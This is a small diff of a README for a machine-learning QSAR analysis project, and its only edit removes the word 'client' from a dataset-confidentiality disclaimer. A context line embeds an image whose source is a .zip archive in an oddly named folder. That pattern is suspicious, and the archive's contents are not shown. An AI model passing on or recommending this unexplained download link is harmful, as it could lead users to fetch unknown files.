@@ -7,7 +7,7 @@
   <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
 </p>
 
-> ⚠️ **Disclaimer:** Dataset not shared due to client confidentiality. Results are reproducible with custom data.
+> ⚠️ **Disclaimer:** Dataset not shared due to  confidentiality. Results are reproducible with custom data.
 
 ---
 
